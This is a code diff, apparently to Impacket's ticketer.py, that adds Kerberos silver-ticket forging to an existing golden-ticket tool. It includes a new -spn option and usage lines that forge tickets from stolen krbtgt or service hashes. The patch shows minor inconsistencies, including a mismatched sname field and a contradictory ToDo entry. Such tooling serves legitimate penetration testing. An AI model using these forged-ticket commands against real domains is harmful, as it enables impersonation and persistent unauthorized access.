@@ -21,14 +21,14 @@
 #    (https://github.com/gentilkiwi/mimikatz)
 #
 # Examples:
-#         ./ticketer.py -nthash <krbtgt nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
+#         ./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
 #
 #         will create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4.
 #         If you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256
 #         (depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as
 #         baduser.ccache.
 #
-#         ./ticketer.py -nthash <krbtgt nthash> -aesKey <krbtgt AES> -domain-sid <your domain SID> -domain <your domain FQDN>
+#         ./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/service AES> -domain-sid <your domain SID> -domain <your domain FQDN>
 #                       -request -user <a valid domain user> -password <valid domain user's password> baduser
 #
 #         will first authenticate against the KDC (using -user/-password) and get a TGT that will be used
@@ -37,7 +37,7 @@
 #         as baduser.ccache.
 #
 # ToDo:
-# [ ] Silver tickets still not implemented
+# [X] Silver tickets still not implemented
 # [ ] When -request is specified, we could ask for a user2user ticket and also populate the received PAC
 #
 import argparse
@@ -79,6 +79,15 @@ class TICKETER:
         self.__target = target
         self.__domain = domain
         self.__options = options
+        if options.spn:
+            spn = options.spn.split(':')[0].split('/')
+            self.__service = spn[0]
+            self.__server = spn[1]
+
+        # we are creating a golden ticket
+        else:
+            self.__service = 'krbtgt'
+            self.__server = self.__domain.upper()
 
     @staticmethod
     def getFileTime(t):
@@ -299,8 +308,8 @@ class TICKETER:
             kdcRep['ticket']['sname'] = noValue
             kdcRep['ticket']['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
             kdcRep['ticket']['sname']['name-string'] = noValue
-            kdcRep['ticket']['sname']['name-string'][0] = 'krbtgt'
-            kdcRep['ticket']['sname']['name-string'][1] = self.__domain.upper()
+            kdcRep['ticket']['sname']['name-string'][0] = self.__service
+            kdcRep['ticket']['sname']['name-string'][1] = self.__target
 
             kdcRep['ticket']['enc-part'] = noValue
             kdcRep['ticket']['enc-part']['kvno'] = 2
@@ -487,8 +496,8 @@ class TICKETER:
         encASRepPart['sname'] = noValue
         encASRepPart['sname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
         encASRepPart['sname']['name-string'] = noValue
-        encASRepPart['sname']['name-string'][0] = 'krbtgt'
-        encASRepPart['sname']['name-string'][1] = self.__domain.upper()
+        encASRepPart['sname']['name-string'][0] = self.__service
+        encASRepPart['sname']['name-string'][1] = self.__server
         logging.info('\tEncAsRepPart')
 
         return encASRepPart, encTicketPart, pacInfos
@@ -658,11 +667,11 @@ if __name__ == '__main__':
     logger.init()
     print version.BANNER
 
-    parser = argparse.ArgumentParser(add_help = True, description = "Creates a Kerberos golden/silver tickets based on "
-                                                                    "user options")
-
-    parser.add_argument('target', action='store', help='username or SPN for the newly created ticket (if \'/\' present '
-                                                       'it is assumed it\'s a SPN and a silver ticket will be created')
+    parser = argparse.ArgumentParser(add_help=True, description="Creates a Kerberos golden/silver tickets based on "
+                                                                "user options")
+    parser.add_argument('target', action='store', help='username for the newly created ticket')
+    parser.add_argument('-spn', action="store", help='SPN (service/server) of the target service the silver ticket will'
+                                                     ' be generated for. if omitted, golden ticket will be created')
     parser.add_argument('-request', action='store_true', default=False, help='Requests ticket to domain and clones it '
                         'changing only the supplied information. It requires specifying -user')
     parser.add_argument('-domain', action='store', required=True, help='the fully qualified domain name (e.g. contoso.com)')
@@ -692,12 +701,12 @@ if __name__ == '__main__':
     if len(sys.argv)==1:
         parser.print_help()
         print "\nExamples: "
-        print "\t./ticketer.py -nthash <krbtgt nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n"
+        print "\t./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser\n"
         print "\twill create and save a golden ticket for user 'baduser' that will be all encrypted/signed used RC4."
         print "\tIf you specify -aesKey instead of -ntHash everything will be encrypted using AES128 or AES256"
         print "\t(depending on the key specified). No traffic is generated against the KDC. Ticket will be saved as"
         print "\tbaduser.ccache.\n"
-        print "\t./ticketer.py -nthash <krbtgt nthash> -aesKey <krbtgt AES> -domain-sid <your domain SID> -domain " \
+        print "\t./ticketer.py -nthash <krbtgt/service nthash> -aesKey <krbtgt/serivce AES> -domain-sid <your domain SID> -domain " \
               "<your domain FQDN> -request -user <a valid domain user> -password <valid domain user's password> baduser\n"
         print "\twill first authenticate against the KDC (using -user/-password) and get a TGT that will be used"
         print "\tas template for customization. Whatever encryption algorithms used on that ticket will be honored,"
@@ -711,10 +720,6 @@ if __name__ == '__main__':
         logging.getLogger().setLevel(logging.DEBUG)
     else:
         logging.getLogger().setLevel(logging.INFO)
-
-    if options.target.find('/') >=0:
-        logging.critical('Silver tickets not yet supported')
-        sys.exit(1)
 
     if options.domain is None:
         logging.critical('Domain should be specified!')
